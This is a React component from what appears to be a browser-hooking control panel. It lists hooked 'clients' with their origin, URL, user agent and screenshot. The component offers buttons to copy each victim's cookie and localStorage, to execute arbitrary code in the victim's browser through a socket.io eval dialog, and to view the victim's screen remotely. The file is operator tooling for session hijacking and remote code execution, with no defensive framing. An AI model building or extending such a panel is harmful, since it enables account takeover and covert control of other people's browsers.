import { Client } from "@/types";
import {
	Card,
	Image,
	CardHeader,
	CardBody,
	Tooltip,
	Modal,
	Button,
	ModalBody,
	ModalContent,
	ModalFooter,
	ModalHeader,
	useDisclosure,
} from "@nextui-org/react";
import {
	ArchiveIcon,
	CookieIcon,
	EarthIcon,
	ScreenShareIcon,
	TerminalIcon,
} from "lucide-react";
import { toast } from "sonner";
import ClientEval from "./ClientEval";
import { Socket } from "socket.io-client";
import ClientRemote from "./ClientRemote";

function ClientModal({
	cat,
	value,
	isOpen,
	onOpenChange,
	socket,
}: {
	cat: string;
	value: Client;
	isOpen: boolean;
	onOpenChange: (open: boolean) => void;
	socket: Socket;
}) {
	const handleCookie = () => {
		// copy cookie
		navigator.clipboard.writeText(value.cookie);
		toast.success("Copied", {
			description: "Cookie copied to clipboard.",
		});
	};

	const handleLocalStorage = () => {
		// copy local storage
		navigator.clipboard.writeText(JSON.stringify(value.localStorage));
		toast.success("Copied", {
			description: "Local storage copied to clipboard.",
		});
	};

	const {
		isOpen: isEvalOpen,
		onOpen: onEvalOpen,
		onOpenChange: onEvalOpenChange,
	} = useDisclosure();
	const {
		isOpen: isRemoteOpen,
		onOpen: onRemoteOpen,
		onOpenChange: onRemoteOpenChange,
	} = useDisclosure();
	return (
		<>
			<Modal isOpen={isOpen} onOpenChange={onOpenChange}>
				<ModalContent>
					{(onClose) => (
						<>
							<ModalHeader className="flex gap-2">
								<EarthIcon />
								{cat}
							</ModalHeader>
							<ModalBody className="flex flex-col gap-2">
								{/* image overlay */}
								{/* <Image
								src={value.image}
								alt={value.agent}
								className="object-fill rounded-sm"
							/> */}
								<div
									style={{
										backgroundImage: `url(${value.image})`,
										backgroundSize: "cover",
										backgroundPosition: "center",
										width: "100%",
										height: "200px",
										borderRadius: "5px",
									}}
								>
									<div
										className="gap-2 p-2 rounded-tl-sm rounded-tr-sm h-[200px] flex items-center transition justify-center bg-[rgba(0,0,0,0.6)] hover:bg-[rgba(0,0,0,0.7)] cursor-pointer"
										onClick={onRemoteOpen}
									>
										<ScreenShareIcon size={32} />
										<p className="text-white text-lg font-semibold">Remote</p>
									</div>
								</div>
								<div className="flex items-start flex-col gap-2">
									<p className="flex items-center gap-1">{value.origin}</p>
									<p className="text-xs text-ellipsis overflow-hidden w-[300px]">
										{value.href}
									</p>
									<p className="text-xs text-ellipsis overflow-hidden text-pretty ">
										{value.agent}
									</p>
									<p className="text-xs text-default-500">{cat}</p>
								</div>
							</ModalBody>
							<ModalFooter>
								<div className="w-full flex justify-between gap-2">
									<Button
										color="primary"
										onClick={onEvalOpen}
										startContent={<TerminalIcon />}
									>
										Execute
									</Button>
									<div className="flex gap-2">
										<Tooltip content="Copy Cookie" placement="top">
											<Button
												color="default"
												onClick={() => handleCookie()}
												isIconOnly
											>
												<CookieIcon />
											</Button>
										</Tooltip>
										<Tooltip content="Copy Local storage" placement="top">
											<Button
												color="default"
												onClick={() => handleLocalStorage()}
												isIconOnly
											>
												<ArchiveIcon />
											</Button>
										</Tooltip>
									</div>
								</div>
							</ModalFooter>
						</>
					)}
				</ModalContent>
			</Modal>
			<ClientEval
				isOpen={isEvalOpen}
				onOpenChange={onEvalOpenChange}
				cat={cat}
				value={value}
				socket={socket}
			/>
			<ClientRemote
				isOpen={isRemoteOpen}
				onOpenChange={onRemoteOpenChange}
				cat={cat}
				value={value}
				socket={socket}
			/>
		</>
	);
}

export default ClientModal;
